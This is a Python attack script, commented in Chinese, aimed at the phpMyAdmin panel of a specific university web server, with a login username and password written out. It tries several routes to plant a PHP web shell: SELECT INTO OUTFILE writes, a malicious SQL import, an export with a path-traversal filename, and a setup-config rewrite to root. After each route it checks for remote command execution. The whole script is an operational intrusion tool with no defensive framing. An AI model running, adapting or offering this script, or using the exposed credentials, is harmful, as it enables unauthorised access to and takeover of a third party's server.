#!/usr/bin/env python3
import requests
import re
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")

# 方法1: 通过phpMyAdmin的SQL执行，写入到phpMyAdmin目录本身
print("[*] 写入到phpMyAdmin目录...")
pma_write_paths = [
    "/var/www/phpmyadmin/shell.php",
    "/usr/share/phpmyadmin/shell.php",
    "/opt/lampp/phpmyadmin/shell.php",
    "/var/www/html/phpmyadmin/shell.php",
]

for write_path in pma_write_paths:
    sql = f"SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '{write_path}';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    time.sleep(1)
    test_url = url + "shell.php?c=id"
    test_resp = requests.get(test_url, verify=False, timeout=5)
    if "uid=" in test_resp.text:
        print(f"[+] Shell获取成功: {test_url}")
        exit(0)

# 方法2: 通过phpMyAdmin的备份恢复功能
print("[*] 备份恢复功能...")
backup_content = """-- MySQL dump
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/enmeeting/shell.php';
"""
files = {"import_file": ("backup.sql", backup_content, "application/sql")}
data = {"format": "sql", "token": token, "db": "scmeeting"}

import_resp = session.post(url + "db_import.php", params={"token": token, "db": "scmeeting"}, files=files, data=data, verify=False, timeout=10)

time.sleep(2)
test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
if "uid=" in test_shell.text:
    print(f"[+] Shell获取成功: https://olympic.su.ac.th/enmeeting/shell.php?c=id")
    exit(0)

# 方法3: 通过phpMyAdmin的导出功能，直接导出为PHP文件
print("[*] 导出为PHP文件...")
# 创建包含shell代码的表
sql = "CREATE TABLE IF NOT EXISTS scmeeting.s(code TEXT); INSERT INTO scmeeting.s VALUES('<?php system($_GET[\"c\"]); ?>');"
sql_data = {"sql_query": sql, "db": "scmeeting"}
session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data, verify=False)

# 尝试导出
export_params = {
    "token": token,
    "db": "scmeeting",
    "table": "s",
    "export_type": "custom",
    "what": "sql",
    "sql_query": "SELECT code FROM s;",
    "asfile": "1",
    "filename_template": "../../../../var/www/html/enmeeting/shell.php",
    "remember_template": "on",
}

export_resp = session.get(url + "db_export.php", params=export_params, verify=False, timeout=10)

time.sleep(2)
test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
if "uid=" in test_shell.text:
    print(f"[+] Shell获取成功: https://olympic.su.ac.th/enmeeting/shell.php?c=id")
    exit(0)

# 方法4: 通过phpMyAdmin的setup功能写入配置文件
print("[*] setup写入config...")
setup_url = url + "setup/"
setup_token = re.search(r'token=([a-f0-9]+)', requests.get(setup_url, verify=False).text)
if setup_token:
    setup_token = setup_token.group(1)
    setup_data = {
        "token": setup_token,
        "Servers/1/host": "localhost",
        "Servers/1/user": "root",
        "Servers/1/password": "",
        "Servers/1/auth_type": "config",
    }
    setup_resp = session.post(setup_url + "index.php", data=setup_data, verify=False, timeout=5)

# 检查config.inc.php
config_test = requests.get(url + "config.inc.php?c=id", verify=False, timeout=5)
if "uid=" in config_test.text:
    print(f"[+] Shell获取成功: {url}config.inc.php?c=id")
    exit(0)

print("[-] 继续尝试...")
